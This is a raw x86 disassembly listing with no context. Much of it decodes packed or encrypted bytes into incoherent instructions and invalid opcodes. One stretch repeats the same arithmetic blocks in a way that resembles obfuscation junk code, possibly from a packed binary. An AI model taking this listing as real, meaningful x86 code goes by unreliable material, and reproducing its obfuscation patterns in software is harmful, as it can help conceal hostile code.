  416b75:	push   esp
  416b76:	mov    ebx,0x1cf2620e
  416b7b:	adc    eax,0x9a12c6cb
  416b80:	cmp    DWORD PTR [ebx-0x1e],0x1f
  416b84:	sub    eax,0x42bb95c0
  416b89:	leave  
  416b8a:	ror    BYTE PTR es:[ebx],0xa8
  416b8e:	cs in  al,dx
  416b90:	pusha  
  416b91:	loop   0x416c0f
  416b93:	leave  
  416b94:	jne    0x416b89
  416b96:	xlat   BYTE PTR ds:[ebx]
  416b97:	sbb    bl,BYTE PTR [ecx-0x13]
  416b9a:	aas    
  416b9b:	push   eax
  416b9c:	sbb    DWORD PTR [ebp+0x384cb772],ebp
  416ba2:	pop    es
  416ba3:	jmp    0x3beb:0x9b2f487a
  416baa:	sub    eax,0xff062a4b
  416baf:	mov    dl,0x29
  416bb1:	mov    edi,0xbdc9987f
  416bb6:	shr    BYTE PTR [ebp-0x18],cl
  416bb9:	arpl   WORD PTR [ebp-0x62],bp
  416bbc:	cmp    DWORD PTR [esi+0x728b701],eax
  416bc2:	loope  0x416c24
  416bc4:	sar    BYTE PTR [ecx-0x763d03f1],cl
  416bca:	jp     0x416b79
  416bcc:	ret    0x1e71
  416bcf:	inc    ecx
  416bd0:	jl     0x416bef
  416bd2:	repnz xchg esp,eax
  416bd4:	sub    ch,BYTE PTR [edi-0x29dd52db]
  416bda:	mov    eax,0xc706dccd
  416bdf:	mov    edi,0x3a2aac19
  416be4:	icebp  
  416be5:	adc    eax,0x8b81eb1e
  416bea:	mov    bl,0x14
  416bec:	inc    esp
  416bed:	and    eax,0xf7b9ce80
  416bf2:	or     esi,DWORD PTR [esi+0x358e95bd]
  416bf8:	push   esi
  416bf9:	repz retf 0x1b08
  416bfd:	hlt    
  416bfe:	jbe    0x416c08
  416c00:	push   edi
  416c01:	fcmovnbe st,st(3)
  416c03:	jl     0x416c56
  416c05:	fsub   st,st(2)
  416c07:	or     BYTE PTR [esi+0x7b7ef5b7],dh
  416c0d:	or     al,0xdf
  416c0f:	lods   eax,DWORD PTR gs:[esi]
  416c11:	in     eax,0x70
  416c13:	jecxz  0x416c7b
  416c15:	in     eax,0xf1
  416c17:	adc    ah,BYTE PTR [edi+ebp*8-0x378e488e]
  416c1e:	mov    dl,0xa4
  416c20:	mov    ah,0xe9
  416c22:	call   0x8011:0x11e4edda
  416c29:	add    al,0x5e
  416c2b:	mov    esp,0xb7f47a2f
  416c30:	ror    dl,0xc8
  416c33:	outs   dx,DWORD PTR ds:[esi]
  416c34:	jg     0x416c91
  416c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c37:	xlat   BYTE PTR ds:[ebx]
  416c38:	test   bl,bl
  416c3a:	mov    dh,0x9d
  416c3c:	or     esi,DWORD PTR [ebx]
  416c3e:	fsubr  st(2),st
  416c40:	push   ecx
  416c41:	lds    edi,FWORD PTR [ebx-0x6300f60c]
  416c47:	pop    esi
  416c48:	pushf  
  416c49:	adc    eax,0x5d0184a3
  416c4e:	fs cdq 
  416c50:	sub    DWORD PTR [ebp+0xa566126],esi
  416c56:	adc    ebp,DWORD PTR [edx]
  416c58:	cdq    
  416c59:	cmc    
  416c5a:	and    ebp,DWORD PTR [ebp+0x0]
  416c5d:	push   ecx
  416c5e:	aas    
  416c5f:	add    cl,BYTE PTR [ebx]
  416c61:	popa   
  416c62:	and    eax,0x5ea3d731
  416c67:	jge    0x416c2c
  416c69:	loop   0x416c63
  416c6b:	dec    ebx
  416c6c:	or     edx,edi
  416c6e:	sbb    al,0xe2
  416c70:	leave  
  416c71:	popf   
  416c72:	fstp   QWORD PTR [edx+eax*4+0x21a9f4cb]
  416c79:	add    DWORD PTR [esi],ecx
  416c7b:	std    
  416c7c:	push   esp
  416c7d:	add    edx,0x5d3cb48a
  416c83:	dec    eax
  416c84:	inc    ebx
  416c85:	scas   al,BYTE PTR es:[edi]
  416c86:	fistp  WORD PTR [ebx]
  416c88:	add    al,bh
  416c8a:	popf   
  416c8b:	loopne 0x416c98
  416c8d:	add    esp,DWORD PTR [eax-0x7a274b1]
  416c93:	xor    edx,eax
  416c95:	xor    ebx,eax
  416c97:	sub    edx,ebx
  416c99:	sub    edx,esi
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    dh,bh
  416df4:	lods   eax,DWORD PTR ds:[esi]
  416df5:	stc    
  416df6:	and    BYTE PTR [ebp+eax*2-0x80],dh
  416dfa:	cmp    DWORD PTR [esi],0x5e
  416dfd:	add    DWORD PTR [ebx-0xbfd2ed3],0xffffffc4
  416e04:	bound  esi,QWORD PTR [esp+edi*8+0x161988a7]
  416e0b:	mov    dh,0xc4
  416e0d:	leave  
  416e0e:	jecxz  0x416e86
  416e10:	rol    DWORD PTR [ecx-0x41],0x86
  416e14:	pop    edx
  416e15:	and    al,0xd3
  416e17:	fldenv [eax+0x1b]
  416e1a:	jmp    0x8255:0x1ab6d1b8
  416e21:	ins    DWORD PTR es:[edi],dx
  416e22:	adc    edi,0xacd00f33
  416e28:	cdq    
  416e29:	int3   
  416e2a:	push   ds
  416e2b:	pop    ds
  416e2c:	jmp    0x416e8e
  416e2e:	add    eax,0x3d649c76
  416e33:	ins    DWORD PTR es:[edi],dx
  416e34:	ins    DWORD PTR es:[edi],dx
  416e35:	aam    0x3b
  416e37:	mov    bh,0xac
  416e39:	(bad)  
  416e3a:	rol    DWORD PTR [edx+0x55b1d0d4],cl
  416e40:	xchg   ebx,eax
  416e41:	inc    edx
  416e42:	xchg   ebx,eax
  416e43:	mov    ecx,0x2d73e5fc
  416e48:	push   ecx
  416e49:	test   eax,0x30858d7f
  416e4e:	test   edx,edi
  416e50:	cmp    al,0x24
  416e52:	les    edx,FWORD PTR [ebx-0x550291c2]
  416e58:	imul   ecx,ecx,0x7dc80e7f
  416e5e:	out    dx,eax
  416e5f:	pop    esi
  416e60:	fild   WORD PTR [ecx+0x188ba1d2]
  416e66:	pop    edi
  416e67:	xchg   esi,eax
  416e68:	jp     0x416ea0
  416e6a:	dec    eax
  416e6b:	cdq    
  416e6c:	mov    esi,?
  416e6e:	xlat   BYTE PTR ds:[ebx]
  416e6f:	and    al,0x19
  416e71:	sub    ah,cl
  416e73:	fs aas 
  416e75:	fisubr WORD PTR [edx+0x518eb3d6]
  416e7b:	pusha  
  416e7c:	imul   esp,DWORD PTR [ebp+0x3],0x3a5f9274
  416e83:	dec    ebp
  416e84:	mov    ebx,0xb10511a2
  416e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8a:	ror    BYTE PTR [esi-0x5b],1
  416e8d:	je     0x416e77
  416e8f:	rol    DWORD PTR [ecx-0x5cc47dd],0x9c
  416e96:	fisubr DWORD PTR [ecx+0x3]
  416e99:	lds    esp,FWORD PTR [esi]
  416e9b:	cdq    
  416e9c:	sbb    eax,DWORD PTR [edx]
  416e9e:	lock dec ecx
  416ea0:	sub    DWORD PTR [ebx-0x5c09c672],eax
  416ea6:	or     eax,0xc2d3ad57
  416eab:	mov    eax,ds:0x9f4f2fd0
  416eb0:	clc    
  416eb1:	or     ebp,edx
  416eb3:	scas   al,BYTE PTR es:[edi]
  416eb4:	xchg   DWORD PTR [esi],ebx
  416eb6:	xchg   esi,eax
  416eb7:	(bad)  
  416eb8:	sub    al,0xaf
  416eba:	(bad)  
  416ebb:	xor    DWORD PTR [esi+0x7e],ebp
  416ebe:	mov    edi,0x48114831
  416ec3:	sub    BYTE PTR [edi+0x75125334],0x97
  416eca:	pop    ebx
  416ecb:	aam    0x6b
  416ecd:	mov    eax,0x3974f848
  416ed2:	test   eax,0x20af9688
  416ed7:	cmp    eax,0x8180f43d
  416edc:	clc    
  416edd:	xchg   esi,eax
  416ede:	add    DWORD PTR [esi-0x5f756cee],edi
  416ee4:	dec    edx
  416ee5:	leave  
  416ee6:	rcl    BYTE PTR [edx],0xeb
  416ee9:	pop    edi
  416eea:	sbb    ecx,DWORD PTR [ecx*8-0x3eb831a2]
  416ef1:	or     eax,0x9b69b9c4
  416ef6:	add    edi,DWORD PTR [ebx+0x641e07f]
  416efc:	pop    edx
  416efd:	loopne 0x416f10
  416eff:	cmp    bh,BYTE PTR [esi+0x18]
  416f02:	int3   
  416f03:	jp     0x416eb6
  416f05:	jb     0x416ea5
  416f07:	sahf   
  416f08:	cld    
  416f09:	(bad)  
  416f0a:	mov    ds:0xfde1e68f,al
  416f0f:	pop    ss
  416f10:	push   edi
  416f11:	jp     0x416ef3
  416f13:	mov    edi,0x95e0057
  416f18:	shl    BYTE PTR [ebx],cl
  416f1a:	pop    ebx
  416f1b:	xor    eax,esp
  416f1d:	inc    eax
  416f1e:	test   DWORD PTR [ebp+0x34acfe4f],esp
  416f24:	sbb    eax,0x6e9780f2
  416f29:	pop    ds
  416f2a:	scas   ax,WORD PTR es:[edi]
  416f2c:	icebp  
  416f2d:	les    ebp,FWORD PTR [ecx+0x61813366]
  416f33:	jbe    0x416ec9
  416f35:	dec    esi
  416f36:	ret    0xed0f
  416f39:	cdq    
  416f3a:	pop    edx
  416f3b:	xor    ecx,DWORD PTR [edi]
  416f3d:	sbb    BYTE PTR [ebp-0x7],al
  416f40:	fstp   QWORD PTR [ebx-0x40]
  416f44:	xchg   edx,eax
  416f45:	mov    edi,0x953f930f
  416f4a:	mov    bl,0x45
  416f4c:	lods   eax,DWORD PTR ds:[esi]
  416f4d:	ret    0x9ef3
  416f50:	jp     0x416f74
  416f52:	lods   eax,DWORD PTR ds:[esi]
  416f53:	aam    0xc3
  416f55:	out    dx,al
  416f56:	or     al,ah
  416f58:	clc    
  416f59:	int3   
  416f5a:	inc    esp
  416f5b:	or     ch,ch
  416f5d:	adc    bl,BYTE PTR [ebp-0x1b]
  416f60:	(bad)  
  416f61:	sbb    bl,BYTE PTR [eax-0x7e]
  416f64:	test   BYTE PTR [ecx+ebx*1],dl
  416f67:	pop    ebx
  416f68:	dec    edx
  416f69:	sbb    eax,0x1ac463e6
  416f6e:	xor    eax,0x75d7af51
  416f73:	int3   
  416f74:	test   DWORD PTR [eax-0x241d6ab1],0x40d63807
  416f7e:	dec    eax
  416f7f:	imul   esi,DWORD PTR [eax-0x7c],0x2b20a310
  416f86:	push   ds
  416f87:	lock mov ds:0xa9239a62,eax
  416f8d:	fist   DWORD PTR [ecx]
  416f8f:	cmp    eax,0x9490bdd0
  416f94:	mov    BYTE PTR [ecx+0x36ba58d9],bh
  416f9a:	sub    DWORD PTR [edi+0x45a0d409],0x6e545c45
  416fa4:	jge    0x416f32
  416fa6:	iret   
  416fa7:	add    ecx,DWORD PTR [esp+ebx*8-0x589a8f83]
  416fae:	push   ecx
  416faf:	(bad)  
  416fb0:	adc    al,0xe6
  416fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb3:	sub    eax,0xb385b230
  416fb8:	xlat   BYTE PTR ds:[ebx]
  416fb9:	pop    ebx
  416fba:	imul   esi,DWORD PTR [esi],0xffffffb9
  416fbd:	pop    es
  416fbe:	mov    dh,BYTE PTR [ecx-0x60]
  416fc1:	xor    bl,BYTE PTR [ecx+0x57]
  416fc4:	inc    edi
  416fc5:	pop    esi
  416fc6:	xor    al,0x9e
  416fc8:	jno    0x416fcb
  416fca:	inc    edi
  416fcb:	mov    eax,0xc24eb570
  416fd0:	ds sbb eax,0x788cff8f
  416fd6:	lock xchg esp,eax
  416fd8:	pop    ebp
  416fd9:	cmp    DWORD PTR [ecx+eax*2-0x6c],0xe85608b8
  416fe1:	push   esi
  416fe2:	div    BYTE PTR [ebx]
  416fe4:	pop    eax
  416fe5:	jmp    0x9836:0xd6ddc6d9
  416fec:	and    BYTE PTR [edx+0x648b7309],0x4a
  416ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff4:	imul   ebp,esp,0xbfac5478
  416ffa:	sub    eax,0xe46c9871
  416fff:	(bad)  
  417000:	mov    ebp,0x92d9c2f8
  417005:	jbe    0x416fd0
  417007:	mov    BYTE PTR [edx],ah
  417009:	cmp    DWORD PTR [ecx],esi
  41700b:	sub    DWORD PTR [esi-0xc5199ee],eax
  417011:	loop   0x41700c
  417013:	dec    ecx
  417014:	xchg   bp,ax
  417016:	test   al,0xb4
  417018:	out    dx,al
  417019:	push   0x2cb118dc
  41701e:	xchg   BYTE PTR [eax],ch
  417020:	rcl    BYTE PTR [esi-0x1d],1
  417023:	scas   al,BYTE PTR es:[edi]
  417024:	int3   
  417025:	jmp    DWORD PTR [edi-0x52f65487]
  41702b:	cmp    BYTE PTR [edx-0x4b],dl
  41702e:	add    al,0xe3
  417030:	lock out dx,al
  417032:	lahf   
  417033:	cmc    
  417034:	stc    
  417035:	dec    eax
  417036:	popf   
  417037:	aam    0xdb
  417039:	or     dh,BYTE PTR [ebx+0x28815227]
  41703f:	mov    ch,0x5b
  417041:	adc    al,0x71
  417043:	or     eax,DWORD PTR [edi]
  417045:	inc    edi
  417046:	aas    
  417047:	loopne 0x416fdc
  417049:	pop    edx
  41704a:	fdiv   QWORD PTR [eax+edi*4]
  41704d:	hlt    
  41704e:	and    ebx,DWORD PTR [edx-0x4d2d10fa]
  417054:	outs   dx,DWORD PTR ds:[esi]
  417055:	cmp    edx,DWORD PTR [edx]
  417057:	sub    bh,ch
  417059:	leave  
  41705a:	push   edi
  41705b:	scas   al,BYTE PTR es:[edi]
  41705c:	sub    BYTE PTR [ebp-0x2d],ah
  41705f:	pop    esp
  417060:	xor    eax,DWORD PTR [eax+0xb407374]
  417066:	test   ebx,eax
  417068:	jmp    0x417022
  41706a:	push   es
  41706b:	arpl   WORD PTR [eax+0x676faf97],bp
  417071:	dec    edx
  417072:	sbb    al,0x53
  417074:	jle    0x417053
  417076:	aaa    
  417077:	mov    cl,0x3e
  417079:	pop    ecx
  41707a:	and    al,BYTE PTR [esi+0x4947fe82]
  417080:	adc    BYTE PTR [eax+0x47],ah
  417083:	pop    ecx
  417084:	(bad)  
  417085:	mov    dl,0xd
  417087:	jmp    0x41708d
  417089:	cmp    esp,DWORD PTR [esp+esi*1+0x29485a93]
  417090:	cwde   
  417091:	sub    BYTE PTR [eax-0x3a9571a8],ah
  417097:	pop    eax
  417098:	push   0xfffffff0
  41709a:	xor    esp,DWORD PTR [edx+0x3068e029]
  4170a0:	int    0x2a
  4170a2:	push   eax
  4170a3:	mov    dl,0xe1
  4170a5:	xchg   esp,eax
  4170a6:	cmc    
  4170a7:	sub    eax,0x2515acc
  4170ac:	clc    
  4170ad:	aas    
  4170ae:	push   0x3d5de597
  4170b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b4:	push   0xc59d7623
  4170b9:	sub    ecx,DWORD PTR [edx+0x5a]
  4170bc:	mov    edx,0x31b35724
  4170c1:	push   0x5c
  4170c3:	pusha  
  4170c4:	pop    ds
  4170c5:	add    al,0x90
  4170c7:	push   edi
  4170c8:	pop    ds
  4170c9:	jnp    0x41704d
  4170cb:	into   
  4170cc:	inc    edi
  4170cd:	fmul   QWORD PTR [esi+0x45]
  4170d0:	jbe    0x4170fa
  4170d2:	sbb    cl,BYTE PTR [edi-0x43]
  4170d5:	outs   dx,BYTE PTR ds:[esi]
  4170d6:	sti    
  4170d7:	mov    esp,0xf26557a4
  4170dc:	sub    BYTE PTR [edx+edi*2],bh
  4170df:	mov    esi,0xaf3a9265
  4170e4:	sbb    BYTE PTR [esi-0x71999747],dh
  4170ea:	push   ds
  4170eb:	inc    ebx
  4170ec:	test   BYTE PTR [edx],bh
  4170ee:	xchg   ebp,eax
  4170ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f0:	add    DWORD PTR [edx-0x61],ecx
  4170f3:	jl     0x41711d
  4170f5:	ins    BYTE PTR es:[edi],dx
  4170f6:	stos   BYTE PTR es:[edi],al
  4170f7:	push   edx
  4170f8:	sub    BYTE PTR ds:0xa03aab5f,dh
  4170fe:	cmp    DWORD PTR [esi],edi
  417100:	lods   al,BYTE PTR ds:[esi]
  417101:	js     0x417116
  417103:	xor    BYTE PTR [edx-0x2ce18a9f],bl
  417109:	sub    BYTE PTR [ebx-0x54],al
  41710c:	jle    0x41709c
  41710e:	add    al,0x9b
  417110:	push   0xffffffa0
  417112:	cld    
  417113:	stos   BYTE PTR es:[edi],al
  417114:	sbb    dl,BYTE PTR [ebx+0x21]
  417117:	sbb    dl,BYTE PTR [esi-0x4cb12126]
  41711d:	sahf   
  41711e:	call   0x3708fec2
  417123:	jae    0x4170ab
  417125:	cmp    ah,BYTE PTR [eax+0x630e8416]
  41712b:	mov    eax,ds:0x80d24e56
  417130:	enter  0xb944,0xd8
  417134:	xor    BYTE PTR [eax+0x69],bl
  417137:	inc    edx
  417138:	loop   0x4170c0
  41713a:	ret    0xb856
  41713d:	mov    al,0x5
  41713f:	in     eax,0xb1
  417141:	aas    
  417142:	mov    edx,edi
  417144:	jmp    0x417155
  417146:	add    al,BYTE PTR [edx+0x6c853ea1]
  41714c:	add    bh,BYTE PTR [esi-0x18dce0e9]
  417152:	ret    0x4d54
  417155:	push   ds
  417156:	add    BYTE PTR [ecx+ebp*2-0x26ca5fa],0x7e
  41715e:	jno    0x4171b8
  417160:	xor    al,0xff
  417162:	clc    
  417163:	dec    esi
  417164:	leave  
  417165:	adc    cl,dl
  417167:	into   
  417168:	sub    al,BYTE PTR [esi-0x37]
  41716b:	test   BYTE PTR [esi+0x214a73d3],al
  417171:	sbb    bh,BYTE PTR ds:0xa3075e98
  417177:	sub    BYTE PTR [edx],0xdb
  41717a:	setne  ah
  41717d:	(bad)  
  41717e:	enter  0x8230,0xfd
  417182:	addr16 (bad) 
  417184:	das    
  417185:	mov    dh,0xe7
  417187:	ret    
  417188:	lods   al,BYTE PTR ds:[esi]
  417189:	mov    ch,0x57
  41718b:	cpuid  
  41718d:	fstp   DWORD PTR [edi]
  41718f:	lahf   
  417190:	mov    ecx,DWORD PTR [eax-0x46]
  417193:	push   0x5a0e202a
  417198:	jmp    DWORD PTR [eax]
  41719a:	sub    ah,BYTE PTR [edx]
  41719c:	push   0x31771c50
  4171a1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4171a3:	mov    esi,0xebe72881
  4171a8:	push   eax
  4171a9:	pop    edi
  4171aa:	mov    ebx,0x1f2462b4
  4171af:	inc    esp
  4171b0:	push   ebx
  4171b1:	cs lahf 
  4171b3:	or     eax,DWORD PTR [edx]
  4171b5:	inc    esp
  4171b6:	and    BYTE PTR [ecx+0x16470e49],cl
  4171bc:	cmp    DWORD PTR [ecx+eiz*2+0x0],0x866839e7
  4171c4:	or     eax,0x9a2b4547
  4171c9:	jne    0x41716d
  4171cb:	adc    eax,0xf021f9a5
  4171d0:	pop    ds
  4171d1:	xchg   edi,eax
  4171d2:	(bad)  
  4171d4:	sahf   
  4171d5:	mov    edx,0xb0774bd6
  4171da:	fisubr WORD PTR [ecx]
  4171dc:	ja     0x4171e5
  4171de:	sub    esp,eax
  4171e0:	in     al,0x9f
  4171e2:	mov    dh,0xaa
  4171e4:	or     DWORD PTR [eax+0x461456cb],0x7b
  4171eb:	sbb    ebp,DWORD PTR [edi-0x39fd24c6]
  4171f1:	ins    BYTE PTR es:[edi],dx
  4171f2:	lods   eax,DWORD PTR ds:[esi]
  4171f3:	cmc    
  4171f4:	call   0xeb2498de
  4171f9:	daa    
  4171fa:	stc    
  4171fb:	in     al,dx
  4171fc:	mov    eax,0xc0c20c6a
  417201:	dec    edx
  417202:	cmp    al,0xf0
  417204:	fdiv   QWORD PTR [ebx+0x4a617cea]
  41720a:	mov    eax,ds:0x3f510032
  41720f:	out    0x40,al
  417211:	sti    
  417212:	push   ss
  417213:	daa    
  417214:	lods   al,BYTE PTR ds:[esi]
  417215:	pop    ebp
  417216:	lahf   
  417217:	popf   
  417218:	outs   dx,BYTE PTR ds:[esi]
  417219:	dec    edi
  41721a:	add    BYTE PTR [ecx-0x7d90134e],bl
  417220:	clc    
  417221:	sti    
  417222:	dec    esp
  417223:	leave  
  417224:	in     al,0xf9
  417226:	test   DWORD PTR [ecx+esi*4-0x26],ebp
  41722a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41722b:	push   eax
  41722c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41722d:	aad    0x9a
  41722f:	jle    0x41724d
  417231:	inc    ecx
  417232:	bound  ecx,QWORD PTR [ebp-0x6a4f2e6f]
  417238:	and    BYTE PTR [edi+0x432e3960],0x34
  41723f:	mov    dl,0x3
  417241:	fs imul ebx,esp,0xe229f41
  417248:	or     bh,dl
  41724a:	into   
  41724b:	in     eax,0xfe
  41724d:	scas   al,BYTE PTR es:[edi]
  41724e:	mov    al,ds:0xf274f32e
  417253:	(bad)  
  417254:	nop
  417255:	xor    al,0xc8
  417257:	and    DWORD PTR [ebp+0x13],ecx
  41725a:	out    dx,eax
  41725b:	pop    edx
  41725c:	cli    
  41725d:	in     eax,dx
  41725e:	sub    al,0x3d
  417260:	popa   
  417261:	xor    al,0x31
  417263:	jns    0x417226
  417265:	jnp    0x4171f2
  417267:	(bad)  
  417268:	arpl   WORD PTR [edx+0x7f],sp
  41726b:	ja     0x4172a8
  41726d:	into   
  41726e:	sbb    esi,DWORD PTR [ecx]
  417270:	or     ebp,ebx
  417272:	jmp    0x417294
  417274:	jecxz  0x417200
  417276:	ror    DWORD PTR [ebp+eiz*2+0x6e],0xe7
  41727b:	hlt    
  41727c:	xchg   DWORD PTR [eax-0x6761ee20],ecx
  417282:	inc    ebx
  417283:	sbb    ecx,esi
  417285:	loop   0x4172d7
  417287:	add    BYTE PTR [ecx],cl
  417289:	fdiv   QWORD PTR [esi+0x23]
  41728c:	jg     0x41726c
  41728e:	arpl   WORD PTR [eax],dx
  417290:	retf   
  417291:	pop    ds
  417292:	ror    BYTE PTR [eax],0x5
  417295:	adc    BYTE PTR [edx-0x1],ah
  417298:	frstor [eax-0x649be4e9]
  41729e:	push   ebp
  4172a0:	dec    edi
  4172a1:	jo     0x4172ad
  4172a3:	(bad)  
  4172a4:	xlat   BYTE PTR ds:[ebx]
  4172a5:	cli    
  4172a6:	mov    eax,0xd7f83e19
  4172ab:	repz mov esi,DWORD PTR [edi]
  4172ae:	fist   DWORD PTR [ebp+edx*4+0x304710d1]
  4172b5:	adc    al,0xa3
  4172b7:	jg     0x41726e
  4172b9:	nop
  4172ba:	push   esp
  4172bb:	xchg   esi,eax
  4172bc:	add    edx,0x952eb4a
  4172c2:	and    dl,BYTE PTR [edx]
  4172c4:	out    0x9a,eax
  4172c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172c7:	mov    ?,WORD PTR [ebx-0xfc79cd7]
  4172cd:	imul   cl
  4172cf:	mov    ebx,0x45cb82c2
  4172d4:	dec    esp
  4172d5:	daa    
  4172d6:	push   ecx
  4172d7:	lock aas 
  4172d9:	pop    eax
  4172da:	vmptrst QWORD PTR [edi-0x31]
  4172de:	lock mov ebp,edx
  4172e1:	dec    ebp
  4172e2:	jp     0x417321
  4172e4:	ret    0x28ee
  4172e7:	test   al,0xd0
  4172e9:	mov    edx,edi
  4172eb:	jae    0x41733d
  4172ed:	sub    DWORD PTR [ebp+eiz*2+0x4f],esp
  4172f1:	adc    eax,0xca93a318
  4172f6:	inc    ecx
  4172f7:	into   
  4172f8:	xor    eax,0x77aa816
  4172fd:	cwde   
  4172fe:	mov    ah,0xf8
  417300:	cmp    bl,BYTE PTR [edx+0x1bc402c7]
  417306:	popf   
  417307:	fstp   DWORD PTR ds:[ebx+0x2dc5658f]
  41730e:	adc    al,0xca
  417310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417311:	cmp    DWORD PTR [eax+edx*4],esp
  417314:	fistp  DWORD PTR [edi+ecx*8]
  417317:	cld    
  417318:	icebp  
  417319:	retf   
  41731a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731b:	pushf  
  41731c:	aaa    
  41731d:	dec    ebp
  41731e:	dec    ebx
  41731f:	or     eax,0x3857a670
  417324:	jg     0x4172e9
  417326:	out    dx,eax
  417327:	sar    bl,cl
  417329:	out    0x3e,al
  41732b:	daa    
  41732c:	fisttp WORD PTR [ebx]
  41732e:	ins    BYTE PTR es:[edi],dx
  41732f:	push   cs
  417330:	stos   BYTE PTR es:[edi],al
  417331:	xchg   edx,eax
  417332:	jmp    0x78a0f9ee
  417337:	(bad)  
  417338:	shr    DWORD PTR [esi],1
  41733a:	dec    esi
  41733b:	div    DWORD PTR [edx-0x6c9f0b70]
  417341:	fild   DWORD PTR ds:0x8d635332
  417347:	leave  
  417348:	xor    ah,BYTE PTR [ebx+0x614f45b5]
  41734e:	pusha  
  41734f:	loope  0x4173a7
  417351:	dec    eax
